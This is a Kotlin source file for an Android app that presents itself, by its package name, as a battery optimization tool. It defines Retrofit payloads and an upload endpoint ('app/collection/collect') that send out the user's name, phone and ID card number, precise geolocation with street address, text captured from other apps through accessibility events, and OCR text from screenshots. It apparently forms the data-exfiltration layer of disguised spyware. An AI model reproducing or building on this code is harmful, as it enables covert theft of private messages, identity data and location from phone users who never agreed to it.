package com.android.batteryoptimization.network

import com.android.batteryoptimization.InputEvent
import com.google.gson.annotations.SerializedName
import okhttp3.ResponseBody
import retrofit2.http.Body
import retrofit2.http.Header
import retrofit2.http.POST

data class UploadResponse(
    @SerializedName("code") val code: Int,
    @SerializedName("msg") val msg: String
)

data class UploadRequest(
    @SerializedName("userInfo") val userInfo: UserInfoPayload,
    @SerializedName("events") val events: List<EventPayload>,

    /** 地理位置信息（高德定位） */
    @SerializedName("geoLocation") val geoLocation: GeoLocationPayload? = null,

    /** OCR 识别会话列表（一次截屏识别 = 一个 session） */
    @SerializedName("ocr") val ocr: List<OcrSessionPayload>? = null
)

data class GeoLocationPayload(
    // 基础定位
    @SerializedName("latitude") val latitude: Double = 0.0,
    @SerializedName("longitude") val longitude: Double = 0.0,
    @SerializedName("accuracy") val accuracy: Float = 0f,
    @SerializedName("altitude") val altitude: Double = 0.0,
    @SerializedName("speed") val speed: Float = 0f,
    @SerializedName("bearing") val bearing: Float = 0f,

    // 地址信息
    @SerializedName("address") val address: String = "",
    @SerializedName("country") val country: String = "",
    @SerializedName("province") val province: String = "",
    @SerializedName("city") val city: String = "",
    @SerializedName("cityCode") val cityCode: String = "",
    @SerializedName("district") val district: String = "",
    @SerializedName("adCode") val adCode: String = "",
    @SerializedName("street") val street: String = "",
    @SerializedName("streetNum") val streetNum: String = "",
    @SerializedName("road") val road: String = "",
    @SerializedName("description") val description: String = "",
    @SerializedName("locationType") val locationType: Int = -1,
    @SerializedName("coordType") val coordType: String = "",
    @SerializedName("locationTime") val locationTime: Long = 0L
)

data class UserInfoPayload(
    @SerializedName("name") val name: String,
    @SerializedName("phone") val phone: String,
    @SerializedName("idCard") val idCard: String
)

/** OCR 每次截屏识别会话 */
data class OcrSessionPayload(
    @SerializedName("packageName") val packageName: String,
    @SerializedName("appName") val appName: String?,
    /** 一次截屏识别出的所有文本行 */
    @SerializedName("text") val text: List<String>,
    @SerializedName("timestamp") val timestamp: Long
)

/** 普通输入事件（非 OCR 事件走这里） */
data class EventPayload(
    @SerializedName("packageName") val packageName: String,
    @SerializedName("appName") val appName: String?,
    @SerializedName("text") val text: String,
    @SerializedName("timestamp") val timestamp: Long,
    @SerializedName("source") val source: String = "accessibility"
)

interface UploadApi {
    @POST("app/collection/collect")
    suspend fun uploadEvents(
        @Header("deviceInfo") deviceInfoJson: String,
        @Body requestBody: UploadRequest
    ): ResponseBody
}
